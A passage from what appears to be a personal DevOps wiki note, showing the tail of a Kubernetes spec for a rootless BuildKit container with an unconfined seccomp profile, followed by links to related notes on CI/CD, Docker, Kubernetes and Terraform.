        image: moby/buildkit:v0.17.1-rootless
        args: ["--addr", "tcp://127.0.0.1:1234", "--oci-worker-no-process-sandbox"]
        securityContext:
          seccompProfile:
            type: Unconfined
          runAsUser: 1000
          runAsGroup: 1000
```

---

## Related Notes
- [[Programming/Software Engineering/DevOps/DevOps Complete Guide|DevOps Complete Guide]]
- [[Programming/Software Engineering/DevOps/CI-CD|CI/CD]]
- [[Programming/Software Engineering/DevOps/Pipeline Design|Pipeline Design]]
- [[Programming/Software Engineering/DevOps/Git|Git]]
- [[Programming/Software Engineering/DevOps/Docker|Docker]]
- [[Programming/Software Engineering/DevOps/Kubernetes|Kubernetes]]
- [[Programming/Software Engineering/DevOps/Terraform|Terraform]]
- [[Programming/Software Engineering/SDLC/Release Engineering & Migrations|Release Engineering & Migrations]]
